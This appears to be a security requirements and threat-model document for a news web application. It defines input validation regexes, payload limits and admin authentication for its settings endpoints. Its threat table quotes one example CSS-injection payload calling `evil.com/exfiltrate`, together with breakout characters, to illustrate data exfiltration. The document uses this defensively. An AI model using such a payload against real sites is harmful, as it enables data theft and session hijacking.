# Security Requirements & Architecture Assessment

## 1. Executive Summary
This document defines the security standards, threat model, input validation rules, and authorization controls for **PublicSpark News Web** in compliance with OWASP Top 10 guidelines and project safety rules.

## 2. Threat Modeling & Attack Surfaces

| Threat ID | Threat Category | Description | Potential Impact | Severity | Implemented Defense |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **TH-01** | **Client-Side Request Tampering** | Attackers craft arbitrary HTTP POST requests from browser DevTools to `/api/settings/theme` or `/api/settings/typography`. | Malicious payloads, CSS injection, layout deformation, or system corruption. | High | Strict Whitelist Key Filtering + Safe HEX/RGBA Regex Validation. |
| **TH-02** | **CSS Injection & Stored XSS** | Malicious CSS strings (e.g., `url('https://evil.com/exfiltrate')` or breakout characters `; < >`) injected into color variables. | Data exfiltration, session hijacking, or defacement. | High | Regex validation rejecting any quotes, semicolons, script tags, or unapproved characters. |
| **TH-03** | **Denial of Service (DoS / Resource Flooding)** | Attackers transmit mega-sized JSON payloads (e.g. 100MB+) to overload server RAM and fill disk storage (`settings.json`). | Node.js Event Loop lockup, out-of-memory crash, server downtime. | High | Hard 10 KB Payload Size Limit with immediate stream destruction (`413 Payload Too Large`). |
| **TH-04** | **Broken Access Control (Unauthorized Mutation)** | Non-admin visitors attempt to alter global branding, social links, or typography. | Unauthorized site-wide modification of public news appearance. | Critical | Admin Authentication Header (`x-admin-key` / `Authorization: Bearer`) + Origin Verification. |

---

## 3. Strict Input Validation Specifications

### 3.1 Color Theme Endpoint (`POST /api/settings/theme`)
1. **Allowed Keys Whitelist**:
   - `primary`
   - `bgPrimary`
   - `bgSurface`
   - `bgSecondary`
   - `textMain`
   - `textMuted`
   - `textSubtle`
   - `accentCrimson`
   - `accentBlue`
   - `borderLight`
   - `borderMedium`
   *(Any key outside this list is immediately stripped.)*

2. **Format Constraints**:
   - Every value must match `SAFE_HEX_REGEX`: `/^#([A-Fa-f0-9]{3}|[A-Fa-f0-9]{6}|[A-Fa-f0-9]{8})$/`
   - OR safe `SAFE_RGBA_REGEX`: `/^rgba?\(\s*(\d{1,3})\s*,\s*(\d{1,3})\s*,\s*(\d{1,3})\s*(?:,\s*(0|1|0?\.\d+))?\s*\)$/`
   - Values containing `;`, `<`, `>`, or quotes are rejected with `400 Bad Request`.

### 3.2 Typography Endpoint (`POST /api/settings/typography`)
1. **Allowed Keys Whitelist**:
   - `headingFont`: String (max 64 characters, letters, spaces, hyphens only).
   - `bodyFont`: String (max 64 characters, letters, spaces, hyphens only).
   - `headingScale`: Integer between `70` and `160`.
   - `bodySize`: Integer between `12` and `24`.
   - `regionalFonts`: Validated dictionary of language codes mapping strictly to validated font strings.

---

## 4. Authentication & Authorization Controls

- **Admin Secret Key**: Configurable via `ADMIN_API_SECRET` environment variable (with fallback for local sandboxes).
- **Header Protocol**:
  - `x-admin-key: <SECRET>` OR `Authorization: Bearer <SECRET>`
- **Behavior**:
  - If a request lacks credentials and originates from outside verified origins, return `403 Forbidden`.
  - Sensitive administrative routes are isolated from public readership endpoints.

---

## 5. Security Verification Status

- [x] Input sanitization implemented in `server/server.js`
- [x] Payload size limit enforced (10 KB ceiling)
- [x] Regex validation on all incoming color values
- [x] Admin authorization headers wired in frontend services
- [x] Tested with adversarial payloads (script tags, oversized strings, invalid hex)
